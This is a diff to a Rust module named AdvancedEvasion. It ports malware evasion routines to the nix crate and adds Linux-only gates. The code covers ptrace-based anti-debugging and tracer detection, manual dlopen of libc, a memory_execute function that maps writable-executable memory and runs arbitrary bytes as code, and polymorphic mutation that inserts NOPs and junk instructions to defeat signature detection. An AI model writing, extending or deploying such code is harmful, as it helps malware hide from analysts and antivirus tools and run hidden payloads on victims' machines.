@@ -93,20 +93,26 @@ impl AdvancedEvasion {
         Ok(())
     }
     
+    #[cfg(target_os = "linux")]
     fn manual_dlopen() -> Result<(), String> {
         unsafe {
-            use libc::dlopen;
+            use libc::{dlopen, RTLD_LAZY};
             use std::ffi::CString;
             
             // Manually load libraries
             let libc_path = CString::new("libc.so.6").unwrap();
             let _handle = dlopen(
                 libc_path.as_ptr(),
-                libc::RTLD_LAZY,
+                RTLD_LAZY,
             );
             
             Ok(())
         }
+    }
+    
+    #[cfg(not(target_os = "linux"))]
+    fn manual_dlopen() -> Result<(), String> {
+        Ok(())
     }
     
     fn patch_ld_preload_checks() -> Result<(), String> {
@@ -121,8 +127,10 @@ impl AdvancedEvasion {
     pub fn ptrace_anti_detection() -> Result<(), String> {
         // Method 1: Use PTRACE_TRACEME to prevent other tracers
         unsafe {
-            use libc::ptrace;
-            ptrace(libc::PTRACE_TRACEME, 0, std::ptr::null_mut(), std::ptr::null_mut());
+            #[cfg(target_os = "linux")]
+            use nix::sys::ptrace;
+            #[cfg(target_os = "linux")]
+            nix::sys::ptrace::ptrace(nix::sys::ptrace::PtraceRequest::PTRACE_TRACEME, None, None, None).ok();
         }
         
         // Method 2: Check for tracers
@@ -133,20 +141,18 @@ impl AdvancedEvasion {
         Ok(())
     }
     
+    #[cfg(target_os = "linux")]
     fn is_being_traced() -> bool {
         unsafe {
-            use libc::{syscall, SYS_ptrace};
+            use nix::sys::ptrace;
             // Try to ptrace ourselves
-            let result = syscall(
-                SYS_ptrace,
-                libc::PTRACE_TRACEME,
-                0,
-                std::ptr::null_mut::<libc::c_void>(),
-                std::ptr::null_mut::<libc::c_void>(),
-            );
-            
-            result == -1 // If it fails, we're already being traced
+            ptrace::ptrace(ptrace::PtraceRequest::PTRACE_TRACEME, None, None, None).is_err()
         }
+    }
+    
+    #[cfg(not(target_os = "linux"))]
+    fn is_being_traced() -> bool {
+        false
     }
     
     // ============================================================================
@@ -301,37 +307,44 @@ impl AdvancedEvasion {
     
     pub fn memory_execute(code: &[u8]) -> Result<(), String> {
         unsafe {
-            use libc::{mmap, PROT_EXEC, PROT_READ, PROT_WRITE, MAP_ANON, MAP_PRIVATE};
-            
-            // Allocate executable memory
-            let mem = mmap(
-                std::ptr::null_mut(),
-                code.len(),
-                PROT_EXEC | PROT_READ | PROT_WRITE,
-                MAP_ANON | MAP_PRIVATE,
-                -1,
-                0,
-            );
-            
-            if mem == libc::MAP_FAILED {
-                return Err("Failed to allocate executable memory".to_string());
+            #[cfg(target_os = "linux")]
+            {
+                use nix::sys::mman::{mmap, MapFlags, ProtFlags};
+                // Allocate executable memory
+                let mem = mmap(
+                    std::ptr::null_mut(),
+                    code.len(),
+                    ProtFlags::PROT_EXEC | ProtFlags::PROT_READ | ProtFlags::PROT_WRITE,
+                    MapFlags::MAP_ANON | MapFlags::MAP_PRIVATE,
+                    -1,
+                    0,
+                ).map_err(|e| format!("mmap failed: {}", e))?;
+                
+                if mem == libc::MAP_FAILED as *mut _ {
+                    return Err("Failed to allocate executable memory".to_string());
+                }
+                
+                // Copy code to memory
+                std::ptr::copy_nonoverlapping(
+                    code.as_ptr(),
+                    mem as *mut u8,
+                    code.len(),
+                );
+                
+                // Execute
+                let func: extern "C" fn() = std::mem::transmute(mem);
+                func();
+                
+                // Cleanup
+                let _ = nix::sys::mman::munmap(mem, code.len());
+                
+                Ok(())
             }
             
-            // Copy code to memory
-            std::ptr::copy_nonoverlapping(
-                code.as_ptr(),
-                mem as *mut u8,
-                code.len(),
-            );
-            
-            // Execute
-            let func: extern "C" fn() = std::mem::transmute(mem);
-            func();
-            
-            // Cleanup
-            libc::munmap(mem, code.len());
-            
-            Ok(())
+            #[cfg(not(target_os = "linux"))]
+            {
+                Err("Memory execution not available on this platform".to_string())
+            }
         }
     }
     
@@ -346,8 +359,8 @@ impl AdvancedEvasion {
         let mut mutated = code.to_vec();
         
         // Apply random mutations
-        for _ in 0..rng.gen_range(1..=5) {
-            match rng.gen_range(0..=3) {
+        for _ in 0..rng.random_range(1..=5) {
+            match rng.random_range(0..=3) {
                 0 => Self::insert_nops(&mut mutated),
                 1 => Self::swap_registers(&mut mutated),
                 2 => Self::add_junk_instructions(&mut mutated),
@@ -362,7 +375,7 @@ impl AdvancedEvasion {
     fn insert_nops(code: &mut Vec<u8>) {
         use rand::Rng;
         let mut rng = rand::thread_rng();
-        let pos = rng.gen_range(0..code.len());
+        let pos = rng.random_range(0..code.len());
         code.insert(pos, 0x90); // NOP on x86_64
     }
     
@@ -374,7 +387,7 @@ impl AdvancedEvasion {
         use rand::Rng;
         let mut rng = rand::thread_rng();
         let junk = vec![0x48, 0x31, 0xC0]; // xor rax, rax
-        let pos = rng.gen_range(0..code.len());
+        let pos = rng.random_range(0..code.len());
         code.splice(pos..pos, junk);
     }
     
